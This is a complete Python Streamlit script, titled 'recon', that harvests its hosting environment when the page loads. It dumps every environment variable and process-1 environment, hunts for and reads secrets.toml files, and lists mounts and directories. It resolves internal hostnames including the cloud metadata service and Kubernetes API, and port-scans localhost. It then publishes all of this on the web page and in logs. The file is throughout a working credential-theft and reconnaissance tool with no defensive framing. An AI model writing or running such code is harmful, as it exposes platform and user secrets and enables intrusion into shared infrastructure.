import streamlit as st, os, socket, subprocess, glob

def sh(c):
    try: return subprocess.run(c, shell=True, capture_output=True, text=True, timeout=8).stdout[:4000]
    except Exception as e: return "ERR:"+repr(e)[:200]

def cat(p):
    try: return open(p).read()[:4000]
    except Exception as e: return "ERR:"+repr(e)[:200]

R={}
R["full_env"]      = dict(os.environ)
R["proc1_environ"] = cat("/proc/1/environ").replace("\x00","\n")
R["net_tcp"]       = sh("cat /proc/net/tcp 2>/dev/null | awk 'NR>1{print $2,$3,$4}' | head -40")
R["routes"]        = sh("cat /proc/net/route 2>/dev/null | head; ip route 2>/dev/null")
R["resolv"]        = cat("/etc/resolv.conf")
R["hosts"]         = cat("/etc/hosts")
R["mounts"]        = sh("cat /proc/mounts 2>/dev/null | grep -ivE 'proc|sys|cgroup|tmpfs ' | head -40")
R["ls_root"]       = sh("ls -la / ; echo ---; ls -la /mount 2>/dev/null; echo ---; ls -la /mount/src 2>/dev/null")
R["ls_shared"]     = sh("ls -la /mount/data 2>/dev/null; ls -la /home 2>/dev/null; ls -la /tmp 2>/dev/null | head")
R["secrets_files"] = sh("find / -name 'secrets.toml' 2>/dev/null | head; find /mount -maxdepth 4 -type f 2>/dev/null | head -40")
R["streamlit_cfg"] = cat(os.path.expanduser("~/.streamlit/config.toml")) + "|" + cat("/mount/src/.streamlit/secrets.toml")
R["whoami"]        = sh("id; hostname; hostname -i 2>/dev/null; cat /etc/hostname")
R["selfproc"]      = sh("cat /proc/self/cgroup 2>/dev/null | head; echo ---; cat /proc/self/status 2>/dev/null | grep -iE 'CapEff|CapPrm|NoNewPrivs|Seccomp'")
# internal DNS + connect probes
probes={}
for name in ["metadata.google.internal","kubernetes.default.svc","localhost","share.streamlit.io",
             "apps-api","dashboard","oauth","control-plane","streamlit-controller","redis","postgres"]:
    try: probes[name]=socket.gethostbyname(name)
    except Exception as e: probes[name]="x:"+type(e).__name__
R["dns"]=probes
# scan own /24 quick (gateway + neighbors) common ports
def chk(ip,port,t=1.5):
    try:
        s=socket.create_connection((ip,port),timeout=t); s.close(); return True
    except: return False
myip=R["whoami"]
R["portscan_localhost"]={p:chk("127.0.0.1",p) for p in [22,80,443,6379,5432,8501,8080,9000,3000,15672,9200,27017]}

st.title("recon")
st.json(R)
import sys
for k,v in R.items(): sys.stderr.write("RECON>>> %s = %s\n"%(k,str(v)[:1800]))
